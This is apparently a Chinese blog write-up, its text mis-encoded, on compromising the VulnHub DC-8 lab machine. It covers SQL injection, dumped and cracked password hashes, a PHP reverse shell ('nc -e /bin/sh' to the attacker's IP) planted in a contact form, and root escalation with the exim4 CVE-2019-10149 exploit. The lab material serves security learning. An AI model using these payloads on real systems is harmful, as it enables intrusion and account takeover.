<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221102234939357.png" alt="image-20221102234939357"></p>
<blockquote>
<p>å‘ç°<br><code>22</code>ç«¯å£<br>è¿è¡Œç€<code>ssh</code></p>
<p>80ç«¯å£ä¸‹<br>å‘ç°æœ‰ä¸ª<code>include</code>é¡µé¢ï¼Œå¯èƒ½éœ€è¦åœ¨è¿™é‡Œä¸Šä¼ æœ¨é©¬æ‹¿shell<br>ç„¶åæœ‰<code>install.mysql.txt</code>ï¼Œçœ‹æ¥å¯èƒ½éœ€è¦ç”¨åˆ°æ•°æ®åº“</p>
</blockquote>
<p>å†<code>dirsearch</code>æ‰«ä¸€ä¸‹</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221102235306844.png" alt="image-20221102235306844"></p>
<blockquote>
<p>å‘ç°æœ‰<code>/user/login</code>é¡µé¢ï¼ŒçŒœæµ‹æ˜¯ç™»å½•åå°çš„é¡µé¢<br>åé¢æ‰¾æ‰¾æœ‰æ²¡æœ‰è´¦å·å¯†ç ä¿¡æ¯</p>
</blockquote>
<p>å†çœ‹çœ‹<code>wapplzer</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221103112318956.png" alt="image-20221103112318956"></p>
<h2><span id="1sqlæ³¨å…¥">1.sqlæ³¨å…¥</span></h2><p>ç„¶ååˆ†æç½‘ç«™é¡µé¢</p>
<p>å‘ç°åœ¨<code>details</code>æ—¶ï¼Œ<code>url</code>å‡ºç°</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">192.168.133.147</span>/?nid=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221103112255720.png" alt="image-20221103112255720"></p>
<p>çœ‹åˆ°æ³¨å…¥å¤„ï¼Œå†ç»“åˆä¹‹å‰çš„<code>nmap</code>æ‰«æçš„ç»“æœï¼Œæœ‰<code>mysql</code>å®‰è£…ï¼ŒçŒœæµ‹å¯èƒ½å­˜åœ¨<code>sql</code>æ³¨å…¥</p>
<p>è¯•è¯•<code>sql</code>æ³¨å…¥æœ‰æ²¡æœ‰ååº”</p>
<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">192.168.133.147</span>/?nid=-<span class="number">1</span> union select schema_name from information_schema.schemata--+</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221103130411912.png" alt="image-20221103130411912"></p>
<p>çœ‹æ¥ç¡®å®æ˜¯å­˜åœ¨<code>sql</code>æ³¨å…¥</p>
<p>æ‰‹åŠ¨æ³¨ä¸éš¾ï¼Œå®Œå…¨æ²¡æœ‰è¿‡æ»¤ï¼Œä½†è¿˜æ˜¯ç”¨<code>sqlmap</code>ç›´æ¥æ¢­å“ˆ</p>
<p>æ•°æ®åº“çŸ¥é“äº†</p>
<p>å…ˆçœ‹çœ‹è¡¨</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221103131256965.png" alt="image-20221103131256965"></p>
<p>çœ‹åˆ°æœ‰ä¸ª<code>users</code>åˆ—ï¼ŒæŸ¥çœ‹æœ‰æ²¡æœ‰æˆ‘ä»¬éœ€è¦çš„åå°ç™»å½•çš„è´¦å·å¯†ç </p>
<p>å‘ç°æœ‰ä¸¤ä¸ªç”¨æˆ·</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221103131824229.png" alt="image-20221103131824229"></p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin <span class="variable">$S</span><span class="variable">$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z</span></span><br><span class="line">john <span class="variable">$S</span><span class="variable">$DqupvJbxVmqjr6cYePnx2A891ln7lsuku</span><span class="regexp">/3if/</span>oRVZJaz5mKC2vF</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯å¯†ç æ˜¯åŠ å¯†çš„ï¼Œæˆ‘ä»¬ç”¨<code>john</code>çˆ†ç ´ä¸€ä¸‹</p>
<p>å…ˆæŠŠå¯†ç å†™å…¥å¯†ç æ–‡æœ¬<code>pass.txt</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221103133656691.png" alt="image-20221103133656691"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221103133745514.png" alt="image-20221103133745514"></p>
<p>ç„¶åå°±ç”¨<code>john</code>è‡ªå¸¦çš„å¯†ç æœ¬å°±è¡Œ</p>
<figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john <span class="keyword">pass</span>.txt</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯å†è¿™é‡Œæˆ‘ç”¨äº†<code>johny</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221103134419589.png" alt="image-20221103134419589"></p>
<p>ä¸€ä¸ªå›¾å½¢åŒ–çš„çˆ†ç ´å·¥å…·</p>
<p>è¿™é‡Œåªå¾—åˆ°<code>john</code>ç”¨æˆ·çš„å¯†ç </p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">turtle</span></span><br></pre></td></tr></table></figure>

<h2><span id="2åå°æ·»åŠ æœ¨é©¬">2.åå°æ·»åŠ æœ¨é©¬</span></h2><p>æ‹¿åˆ°è´¦å·å¯†ç åï¼Œæˆ‘ä»¬åˆ°åå°ç™»å½•é¡µé¢è¿›è¡Œç™»å½•</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">133.147</span><span class="regexp">/user/</span>login</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221103134815814.png" alt="image-20221103134815814"></p>
<p>ç™»å½•æˆåŠŸï¼Œæ ¹æ®ä¹‹å‰æˆ‘ä»¬ä¿¡æ¯æ”¶é›†ï¼Œåœ¨<code>nmap</code>å¾—åˆ°çš„ä¿¡æ¯ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸Šä¼ æœ¨é©¬æˆ–è€…ä¿®æ”¹æ–‡ä»¶å†…å®¹çš„åœ°æ–¹</p>
<p>åœ¨å³ä¸Šè§’æˆ‘ä»¬çœ‹åˆ°æœ‰ä¸ª<code>content</code></p>
<p>æ‰“å¼€çœ‹çœ‹é‡Œé¢æ˜¯ä¸æ˜¯å¯ä»¥ä¿®æ”¹</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221103135017243.png" alt="image-20221103135017243"></p>
<p>ç»“æœå‘ç°<code>Contact Us</code>é¡µé¢æ–‡ä»¶å¯ä»¥è¿›è¡Œä¿®æ”¹</p>
<p>æ‰“å¼€çœ‹çœ‹ï¼Œå‘ç°åœ¨<code>edit</code>æ²¡æœ‰ä¿®æ”¹çš„åœ°æ–¹</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221103142531482.png" alt="image-20221103142531482"></p>
<p>äºæ˜¯æ‰¾äº†æ‰¾ç½‘ç«™æºç åœ¨</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221103143057684.png" alt="image-20221103143057684"></p>
<p>è¿™é‡Œå¯ä»¥ä¿®æ”¹ï¼Œäºæ˜¯æˆ‘ä»¬å°±ä¿®æ”¹ä¸€ä¸‹</p>
<p>å¹¶è®°å¾—æŠŠç¼–ç æ–‡ä»¶æ ¼å¼æ”¹ä¸º<code>PHP code</code></p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Thanks for taking the time to contact us. We shall be in contact soon.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="language-php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="language-php"><span class="title function_ invoke__">system</span>(<span class="string">&quot;nc -e /bin/sh 192.168.133.140 8888&quot;</span>);</span></span><br><span class="line"><span class="language-php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221103143148817.png" alt="image-20221103143148817"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221103144244656.png" alt="image-20221103144244656">ç„¶ååº•ä¸‹ä¿å­˜</p>
<h2><span id="3åå¼¹shell">3.åå¼¹shell</span></h2><p>ç„¶åæˆ‘ä»¬å¼€å§‹ç›‘å¬</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvnp <span class="number">8888</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221103145521745.png" alt="image-20221103145521745"></p>
<p>è®¿é—®<code>Contact Us</code>é¡µé¢å‘é€ä¿¡æ¯ï¼Œä»è€Œè§¦å‘phpæ‰§è¡Œå‘½ä»¤</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221103145747096.png" alt="image-20221103145747096"></p>
<p>æ‹¿åˆ°<code>shell</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221103145811789.png" alt="image-20221103145811789"></p>
<h2><span id="4ææƒexim4">4.ææƒã€exim4ã€‘</span></h2><p>å…ˆè¿›å…¥äº¤äº’å¼<code>shell</code></p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="symbol">&#x27;import</span> pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)&#x27;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221103145952120.png" alt="image-20221103145952120"></p>
<p>å…ˆæŸ¥çœ‹ä¸€ä¸‹<code>suid</code>å‘½ä»¤</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">find</span> / -perm <span class="attribute">-u</span>=s -type f 2&gt;/dev/<span class="literal">null</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221103150054750.png" alt="image-20221103150054750"></p>
<p>æ‰¾åˆ°äº†ä¸ªæ–°çš„å‘½ä»¤<code>exim4</code>ï¼Œæœäº†ä¸€ä¸‹</p>
<blockquote>
<p><code>exim4</code></p>
<p><code>exim</code>è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´åˆ†æï¼ˆ<code>cve-2019-10149</code>ï¼‰</p>
<p>åœ¨å¯¹Eximé‚®ä»¶æœåŠ¡å™¨æœ€æ–°æ”¹åŠ¨è¿›è¡Œä»£ç å®¡è®¡è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬å‘ç°4.87åˆ°4.91ç‰ˆæœ¬ä¹‹é—´çš„Eximå­˜åœ¨ä¸€ä¸ªè¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼ˆRCEï¼‰æ¼æ´ã€‚è¿™é‡ŒRCEæŒ‡çš„æ˜¯è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼ˆRemote Command Executionï¼‰ï¼Œè€Œä¸æ˜¯è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRemote Code Executionï¼‰ï¼š<code>æ”»å‡»è€…å¯ä»¥ä»¥rootæƒé™ä½¿ç”¨execv()æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œåˆ©ç”¨è¿‡ç¨‹ä¸­ä¸æ¶‰åŠåˆ°å†…å­˜ç ´åæˆ–è€…ROPï¼ˆReturn-Oriented Programmingï¼‰ç›¸å…³å†…å®¹ã€‚</code></p>
<p>è¿™ä¸ªæ¼æ´å¯ä»¥ç”±æœ¬åœ°æ”»å‡»è€…ç›´æ¥åˆ©ç”¨ï¼ˆè¿œç¨‹æ”»å‡»è€…éœ€è¦åœ¨ç‰¹å®šçš„éé»˜è®¤é…ç½®ä¸‹åˆ©ç”¨ï¼‰ã€‚ä¸ºäº†åœ¨é»˜è®¤é…ç½®ä¸‹è¿œç¨‹åˆ©ç”¨è¯¥æ¼æ´ï¼Œæ”»å‡»è€…éœ€è¦ä¸å­˜åœ¨æ¼æ´çš„æœåŠ¡å™¨å»ºè¿7å¤©ï¼ˆå¯ä»¥æ¯éš”å‡ åˆ†é’Ÿå‘é€1ä¸ªå­—èŠ‚ï¼‰ã€‚ç„¶è€Œç”±äºEximçš„ä»£ç éå¸¸å¤æ‚ï¼Œæˆ‘ä»¬æ— æ³•ä¿è¯è¿™é‡Œä»‹ç»çš„æ–¹æ³•æ˜¯å”¯ä¸€çš„åˆ©ç”¨æ–¹æ³•ï¼Œå¯èƒ½è¿˜å­˜åœ¨å…¶ä»–æ›´åŠ å¿«æ·çš„æ–¹æ³•ã€‚</p>
<p>ä»4.87ç‰ˆå¼€å§‹ï¼ˆ2016å¹´4æœˆ6æ—¥å…¬å¸ƒï¼‰ï¼Œç”±äº#ifdef EXPERIMENTAL_EVENTæ”¹æˆäº†#ifndef DISABLE_EVENTï¼Œå› æ­¤Eximé»˜è®¤æƒ…å†µä¸‹å°±å­˜åœ¨æ¼æ´ã€‚åœ¨ä¹‹å‰çš„ç‰ˆæœ¬ä¸­ï¼Œå¦‚æœæ‰‹åŠ¨å¯ç”¨äº†EXPERIMENTAL_EVENTé€‰é¡¹ï¼Œé‚£ä¹ˆæœåŠ¡å™¨ä¹Ÿä¼šå­˜åœ¨æ¼æ´ã€‚ä»¤äººæƒŠè®¶çš„æ˜¯ï¼Œè¿™ä¸ªæ¼æ´å·²ç»åœ¨4.92ç‰ˆä¸­è¢«ä¿®å¤ï¼ˆ2019å¹´2æœˆ10æ—¥ï¼‰ï¼š</p>
</blockquote>
<p>æ ¹æ®æ–‡æ¡£ï¼Œå‘ç°æ˜¯ä¸ªå’Œé‚®ä»¶æœåŠ¡æœ‰å…³çš„å‘½ä»¤ï¼Œå¹¶ä¸”å­˜åœ¨å‘½ä»¤æ‰§è¡Œæ¼æ´</p>
<p>æˆ‘ä»¬å…ˆæŸ¥çœ‹ä¸€ä¸‹å…¶ç‰ˆæœ¬æ˜¯å¦åœ¨è¿™ä¸ª<code>nday</code>çš„èŒƒå›´é‡Œ</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221103150517673.png" alt="image-20221103150517673"></p>
<p>å‘ç°åˆšå¥½æ˜¯è¿™ä¸ªç‰ˆæœ¬èŒƒå›´ï¼Œæ˜¯å­˜åœ¨<code>RCE</code></p>
<p>æŸ¥çœ‹ä¸€ä¸‹æœ‰æ²¡æœ‰åˆ©ç”¨çš„è„šæœ¬</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221103151738985.png" alt="image-20221103151738985"></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Privilegeï¼šç‰¹æƒ</span><br></pre></td></tr></table></figure>

<p>é€‰æ‹©<code>46996.sh</code>ï¼Œæˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹è„šæœ¬æ–‡ä»¶å†…å®¹</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">searchsploit <span class="number">46996</span> -p  </span><br><span class="line"></span><br><span class="line">cat <span class="regexp">/usr/</span>share<span class="regexp">/exploitdb/</span>exploits<span class="regexp">/linux/</span>local/<span class="number">46996</span>.sh</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221103151838092.png" alt="image-20221103151838092"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221103152003846.png" alt="image-20221103152003846"></p>
<p>å‘ç°æœ‰ä¸¤ä¸ªä½¿ç”¨æ–¹æ³•ï¼Œä¸€ä¸ª<code>setuid</code>ï¼Œä¸€ä¸ª<code>netcat</code></p>
<p>ä¸»è¦æ˜¯ä¸Šä¼ åˆ°é¶æœº<code>shell</code>åï¼Œæ‰§è¡Œå‘½ä»¤ä¸åŒ</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./raptor_exim_wiz -m setuid</span><br><span class="line">æˆ–</span><br><span class="line">./raptor_exim_wiz -m netcat</span><br></pre></td></tr></table></figure>





<p>æˆ‘ä»¬å…ˆæŠŠè„šæœ¬æ–‡ä»¶å¤åˆ¶ä¸‹æ¥</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221103152351530.png" alt="image-20221103152351530"></p>
<p>å†ä¸Šä¼ åˆ°é¶æœº<code>shell</code></p>
<p><code>kali</code>ä¸»æœºæ‰§è¡Œ</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvp <span class="number">9999</span> &lt; raptor_exim_wiz</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221103152714451.png" alt="image-20221103152714451"></p>
<p>é¶æœº<code>shell</code>ä¸­æ‰§è¡Œ</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nc</span> <span class="number">192.168.133.140</span> <span class="number">9999</span> &gt; raptor_exim_wiz</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221103153550325.png" alt="image-20221103153550325"></p>
<p>å‘ç°æƒé™ä¸å¤Ÿï¼Œçœ‹æ¥æ˜¯ä¸èƒ½åœ¨è¿™ä¸ªé¡µé¢æ–°å»ºæ–‡ä»¶</p>
<p>æˆ‘ä»¬åˆ°<code>/tmp</code>ç›®å½•ä¸‹ä¸€èˆ¬å¯ä»¥</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221103153658085.png" alt="image-20221103153658085"></p>
<p>ä¸‹è½½æˆåŠŸ</p>
<p>æ‰§è¡Œææƒ</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./raptor_exim_wiz -m setuid</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221103153740349.png" alt="image-20221103153740349"></p>
<p>å‘ç°æ— æ‰§è¡Œæƒé™ï¼Œæˆ‘ä»¬ä¿®æ”¹ä¸€ä¸‹</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">chmod</span> <span class="number">777</span> raptor_exim_wiz</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221103153901179.png" alt="image-20221103153901179"></p>
<p>æˆåŠŸæ‰§è¡Œè„šæœ¬</p>
<hr>
<h3><span id="æ„å¤–">æ„å¤–</span></h3><p>ä½†ç»“æœå‘ç°è¿˜æ˜¯</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221103154130346.png" alt="image-20221103154130346"></p>
<p>ä½æƒé™è´¦å·</p>
<p>äºæ˜¯æˆ‘ä»¬å†æ‰§è¡Œ</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./raptor_exim_wiz -m netcat</span><br></pre></td></tr></table></figure>

<p>ç»“æœè¿˜æ˜¯ä¸€æ ·</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221103155324498.png" alt="image-20221103155324498"></p>
<p>è€Œä¸”æé†’åœ¨é¶æœºçš„<code>31337</code>ç«¯å£è¿æ¥å…³é—­äº†</p>
<p>çœ‹äº†çœ‹å…¶ä»–å¤§ä½¬çš„<code>wp</code></p>
<p>å‘ç°æœ‰ä¸€æ­¥ã€å…¶å®æ˜¯æ²¡å¿…è¦çš„ã€‘</p>
<blockquote>
<p>åœ¨è„šæœ¬æ–‡ä»¶é‡Œæ‰§è¡Œ<br>è¯´æ˜¯å› ä¸ºè¿™ä¸ªè„šæœ¬æ˜¯<code>windows</code>åº•ä¸‹ç¼–å†™çš„ï¼Œæ‰€ä»¥éœ€è¦ä¿®æ”¹ä¸€ä¸‹ï¼Œæ”¹æˆ<code>Linux</code><br><code>set ff=unix</code></p>
</blockquote>
<p>ç»“æœè¿˜æ˜¯ä¸€æ ·ï¼Œçœ‹æ¥æ˜¯é¶æœºæœ‰é—®é¢˜äº†ï¼ŒçŒœæµ‹æ˜¯é¶æœºå’Œ<code>kali</code>ä¸»æœºä¹‹é—´è¿æ¥æœ‰é—®é¢˜ï¼Œæˆ‘æ¢æ‰‹æœºçƒ­ç‚¹è¯•è¯•</p>
<hr>
<p>æˆåŠŸã€æ ¡å›­ç½‘çœŸåƒåœ¾ã€‘</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221103160625006.png" alt="image-20221103160625006"></p>
<p>åˆ°æ ¹ç›®å½•æŸ¥çœ‹<code>flag</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221103160824407.png" alt="image-20221103160824407"></p>
<p>å¾—åˆ°<code>flag</code></p>
<blockquote>
<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">888      <span class="number"> 888 </span>        <span class="number"> 888 </span>888      8888888b.                            <span class="number"> 888 </span>888<span class="number"> 888 </span>888</span><br><span class="line">888   o  <span class="number"> 888 </span>        <span class="number"> 888 </span>888     <span class="number"> 888 </span> &quot;Y88b                           <span class="number"> 888 </span>888<span class="number"> 888 </span>888</span><br><span class="line">888  d8b <span class="number"> 888 </span>        <span class="number"> 888 </span>888     <span class="number"> 888 </span>  <span class="number"> 888 </span>                          <span class="number"> 888 </span>888<span class="number"> 888 </span>888</span><br><span class="line">888 d888b<span class="number"> 888 </span> .d88b. <span class="number"> 888 </span>888     <span class="number"> 888 </span>  <span class="number"> 888 </span> .d88b.  88888b.   .d88b. <span class="number"> 888 </span>888<span class="number"> 888 </span>888</span><br><span class="line">888d88888b888 d8P  Y8b<span class="number"> 888 </span>888     <span class="number"> 888 </span>  <span class="number"> 888 </span>d88&quot;&quot;88b<span class="number"> 888 </span>&quot;88b d8P  Y8b<span class="number"> 888 </span>888<span class="number"> 888 </span>888</span><br><span class="line">88888P Y88888<span class="number"> 88888888 </span>888<span class="number"> 888 </span>    <span class="number"> 888 </span>  <span class="number"> 888 </span>888 <span class="number"> 888 </span>888 <span class="number"> 888 </span>88888888 Y8P Y8P Y8P Y8P</span><br><span class="line">8888P   Y8888 Y8b.    <span class="number"> 888 </span>888     <span class="number"> 888 </span> .d88P Y88..88P<span class="number"> 888 </span><span class="number"> 888 </span>Y8b.      &quot;   &quot;   &quot;   &quot;</span><br><span class="line">888P     Y888  &quot;Y8888 <span class="number"> 888 </span>888      8888888P&quot;   &quot;Y88P&quot; <span class="number"> 888 </span><span class="number"> 888 </span> &quot;Y8888 <span class="number"> 888 </span>888<span class="number"> 888 </span>888</span><br></pre></td></tr></table></figure>

<p><code>Hope you enjoyed DC-8.  Just wanted to send a big thanks out there to all those</code><br><code>who have provided feedback, and all those who have taken the time to complete these little</code><br><code>challenges.</code></p>
<p><code>I&#39;m also sending out an especially big thanks to:</code></p>
<p><code>@4nqr34z</code><br><code>@D4mianWayne</code><br><code>@0xmzfr</code><br><code>@theart42</code></p>
<p><code>This challenge was largely based on two things:</code></p>
<ol>
<li><code>A Tweet that I came across from someone asking about 2FA on a Linux box, and whether it was worthwhile.</code></li>
<li><code>A suggestion from @theart42</code></li>
</ol>
<p><code>The answer to that question is...</code></p>
<p><code>If you enjoyed this CTF, send me a tweet via @DCAU7.</code></p>
<p>æ„æ€æ˜¯ï¼š<br>å¸Œæœ›ä½ å–œæ¬¢ DC-8ã€‚åªæ˜¯æƒ³å‘æ‰€æœ‰è¿™äº›äººè¡¨ç¤ºè¡·å¿ƒçš„æ„Ÿè°¢<br>æä¾›åé¦ˆçš„äººï¼Œä»¥åŠæ‰€æœ‰èŠ±æ—¶é—´å®Œæˆè¿™äº›å°äº‹çš„äºº<br>æŒ‘æˆ˜ã€‚</p>
<p>æˆ‘è¿˜è¦ç‰¹åˆ«æ„Ÿè°¢ï¼š</p>
<p>@4nqr34z<br>@D4mianWayne<br>@0xmzfr<br>@å¿ƒ42</p>
<p>è¿™ä¸€æŒ‘æˆ˜ä¸»è¦åŸºäºä¸¤ä»¶äº‹ï¼š</p>
<ol>
